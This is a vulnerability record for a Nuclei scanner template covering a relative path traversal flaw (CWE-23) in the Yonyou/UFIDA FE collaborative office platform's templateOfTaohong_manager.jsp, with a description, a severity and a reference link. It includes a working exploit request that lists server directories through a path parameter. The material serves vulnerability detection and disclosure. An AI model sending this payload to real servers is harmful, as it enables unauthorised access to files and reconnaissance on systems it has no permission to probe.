# Nuclei Template: FE collaborative Office templateOfTaohong_manager.jsp - Path Traversal
**Template ID:** yonyou-fe-directory-traversal
**Vulnerability Class:** Relative Path Traversal
**Severity:** Medium
**CWE:** CWE-23
**Source:** Nuclei Template (`yonyou-fe-directory-traversal.yaml`)

## Vulnerability Information & PoC

## Description
There is a directory traversal vulnerability in the templateOfTaohong_manager.jsp file of UFIDA FE collaborative office platform. Through the vulnerability, attackers can obtain directory files and other information, leading to further attacks.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../
```

## References
- https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20FE%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0%20templateOfTaohong_manager.jsp%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md
